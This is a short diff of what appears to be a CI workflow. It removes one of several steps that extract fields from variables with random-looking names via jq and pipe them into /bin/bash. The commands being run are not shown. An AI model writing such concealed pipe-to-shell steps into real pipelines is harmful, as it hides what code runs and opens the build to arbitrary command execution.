@@ -32,7 +32,6 @@ jobs:
           echo $uoelt418 | jq -r .je145 | /bin/bash
           echo $yi524 | jq -r .vppj4 | /bin/bash
           printf '%s' "$sy62922" | jq -r .vff9 | /bin/bash
-          echo $eha4 | jq -r .fh4490 | /bin/bash
           echo $l13 | jq -r .bswm0 | /bin/bash
 
       - name: Save output
